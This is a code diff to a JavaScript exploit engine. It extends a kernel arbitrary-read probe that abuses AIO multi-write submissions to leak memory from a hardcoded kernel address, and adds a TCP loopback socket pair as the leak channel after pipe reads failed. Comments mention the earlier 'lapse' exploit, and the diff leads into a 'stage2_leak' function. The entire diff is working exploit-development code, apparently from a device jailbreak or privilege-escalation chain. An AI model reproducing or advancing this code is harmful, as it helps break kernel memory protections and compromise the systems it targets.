@@ -69,6 +69,11 @@ const SYS_CLOSE          = 0x006;
 const SYS_GETPID         = 0x014;
 const SYS_SOCKET         = 0x061;
 const SYS_SOCKETPAIR     = 0x035;
+const SYS_ACCEPT         = 0x01E;
+const SYS_GETSOCKNAME    = 0x020;
+const SYS_CONNECT        = 0x062;
+const SYS_BIND           = 0x068;
+const SYS_LISTEN         = 0x06A;
 const AIO_CMD_MULTI_READ = 0x1001;
 const AIO_CMD_MULTI_WRITE = 0x1002;
 const SYS_SETSOCKOPT     = 0x069;
@@ -1172,40 +1177,83 @@ export function makeBagagwaEngine(X) {
         const known = i64(0x805c0210, 0xffffffff); // aio_multi_wait body (writeup)
         const SIZE = 0x20;
         note("[ARB] AIO arbitrary-read probe (known=0xffffffff805c0210)");
-        let rfd = -1, wfd = -1;
+        let rfd = -1, wfd = -1, cl = -1, sv = -1, rbuf = null, reqs = null, ids = null;
         try {
             const pfd = safeAlloc(8, "arb-pipe");
-            const reqs = safeAlloc(0x28, "arb-reqs");
-            const ids = safeAlloc(4, "arb-ids");
-            const rbuf = safeAlloc(SIZE, "arb-rbuf");
-            if (!pfd || !reqs || !ids || !rbuf) { note("[ARB] OOM"); return; }
+            reqs = safeAlloc(0x28, "arb-reqs");
+            ids = safeAlloc(4, "arb-ids");
+            rbuf = safeAlloc(SIZE, "arb-rbuf");
+            const sbuf = safeAlloc(4, "arb-sbuf");
+            if (!pfd || !reqs || !ids || !rbuf || !sbuf) { note("[ARB] OOM"); return; }
+
+            // ---- pipe sanity: is a DIRECT pipe read even allowed? (last run EPERM) ----
             w32(pfd.u8, 0, 0); w32(pfd.u8, 4, 0);
             const pr = await sys(SYS_PIPE2, pfd.base, 0);
-            if (pr.failed) { note("[ARB] pipe2 failed " + pr.errText); return; }
-            rfd = r32(pfd.u8, 0) | 0; wfd = r32(pfd.u8, 4) | 0;
-            track(rfd); track(wfd);
+            if (!pr.failed) {
+                rfd = r32(pfd.u8, 0) | 0; wfd = r32(pfd.u8, 4) | 0;
+                track(rfd); track(wfd);
+                await sys(SYS_FCNTL, rfd, 4, 4); // O_NONBLOCK
+                w32(sbuf.u8, 0, 0x41424344);
+                await sys(SYS_WRITE, wfd, sbuf.base, 4);
+                const rd0 = await sys(SYS_READ, rfd, rbuf.base, 4);
+                note("[ARB] pipe sanity read ret=" + rd0.s32 + " err=" + rd0.errText);
+            }
 
-            // An empty-pipe read MUST NOT block: a blocking read here wedges the
-            // whole chain worker (seen last run as WATCHDOG on the NEXT syscall).
-            const fl = await sys(SYS_FCNTL, rfd, 4, 4); // F_SETFL, O_NONBLOCK
-            note("[ARB] fcntl(O_NONBLOCK) ret=" + fl.s32 + " err=" + fl.errText);
+            // ---- TCP loopback pair (lapse used sockets; pipe reads are EPERM) ----
+            const sa = safeAlloc(16, "arb-sa");
+            const lenb = safeAlloc(4, "arb-len");
+            if (sa && lenb) {
+                sa.u8[0] = 16; sa.u8[1] = AF_INET;
+                w16(sa.u8, 2, 0);
+                sa.u8[4] = 127; sa.u8[5] = 0; sa.u8[6] = 0; sa.u8[7] = 1;
+                for (let i = 8; i < 16; i++) sa.u8[i] = 0;
+                const ls = await sys(SYS_SOCKET, AF_INET, SOCK_STREAM, 0);
+                if (!ls.failed) {
+                    let r = await sys(SYS_BIND, ls.s32, sa.base, 16);
+                    note("[ARB] bind ret=" + r.s32 + " err=" + r.errText);
+                    if (!r.failed) {
+                        w32(lenb.u8, 0, 16);
+                        await sys(SYS_GETSOCKNAME, ls.s32, sa.base, lenb.base);
+                        r = await sys(SYS_LISTEN, ls.s32, 1);
+                        note("[ARB] listen ret=" + r.s32 + " err=" + r.errText);
+                        if (!r.failed) {
+                            const cc = await sys(SYS_SOCKET, AF_INET, SOCK_STREAM, 0);
+                            if (!cc.failed) {
+                                r = await sys(SYS_CONNECT, cc.s32, sa.base, 16);
+                                note("[ARB] connect ret=" + r.s32 + " err=" + r.errText);
+                                if (!r.failed) {
+                                    const cn = await sys(SYS_ACCEPT, ls.s32, 0, 0);
+                                    note("[ARB] accept ret=" + cn.s32 + " err=" + cn.errText);
+                                    if (!cn.failed) { cl = cc.s32; sv = cn.s32; }
+                                    else { await sys(SYS_CLOSE, cc.s32); }
+                                } else { await sys(SYS_CLOSE, cc.s32); }
+                            }
+                        }
+                    }
+                    await sys(SYS_CLOSE, ls.s32);
+                }
+            }
 
-            // candidate layouts: [aio_buf offset, aio_nbytes offset]. lapse puts
-            // aio_buf at +0x10 and fd at +0x20; nbytes is +0x08/+0x18/+0x00.
+            const pairOk = (cl >= 0 && sv >= 0);
+            const target = pairOk ? cl : wfd;   // AIO write destination
+            const reader = pairOk ? sv : rfd;   // where the leaked bytes land
+            note("[ARB] target=" + target + " reader=" + reader + " (pairOk=" + pairOk + ")");
+            if (reader >= 0) await sys(SYS_FCNTL, reader, 4, 4); // O_NONBLOCK
+
             const layouts = [[0x10, 0x08], [0x10, 0x18], [0x10, 0x00]];
             for (let li = 0; li < layouts.length; li++) {
                 const bo = layouts[li][0], no = layouts[li][1];
                 for (let z = 0; z < 0x28; z++) reqs.u8[z] = 0;
                 w64(reqs.u8, bo, known);
                 w64(reqs.u8, no, i64(SIZE, 0));
-                w32(reqs.u8, 0x20, wfd);
+                w32(reqs.u8, 0x20, target);
                 for (let z = 0; z < 4; z++) ids.u8[z] = 0;
                 let sub;
                 try { sub = await sys(SYS_AIO_SUBMIT_CMD, AIO_CMD_MULTI_WRITE, reqs.base, 1, 3, ids.base); }
                 catch (e) { note("[ARB] L" + li + " submit threw " + (e && e.message ? e.message : e)); continue; }
                 await sleep(150);
                 const id = r32(ids.u8, 0) | 0;
-                const rd = await sys(SYS_READ, rfd, rbuf.base, SIZE);
+                const rd = await sys(SYS_READ, reader, rbuf.base, SIZE);
                 let hex = "";
                 const got = (rd.failed || rd.s32 <= 0) ? 0 : rd.s32;
                 for (let i = 0; i < got && i < SIZE; i++)
@@ -1220,6 +1268,8 @@ export function makeBagagwaEngine(X) {
         }
         try { if (rfd >= 0) await sys(SYS_CLOSE, rfd); } catch (_) {}
         try { if (wfd >= 0) await sys(SYS_CLOSE, wfd); } catch (_) {}
+        try { if (cl >= 0) await sys(SYS_CLOSE, cl); } catch (_) {}
+        try { if (sv >= 0) await sys(SYS_CLOSE, sv); } catch (_) {}
     }
 
     async function stage2_leak(opts) {
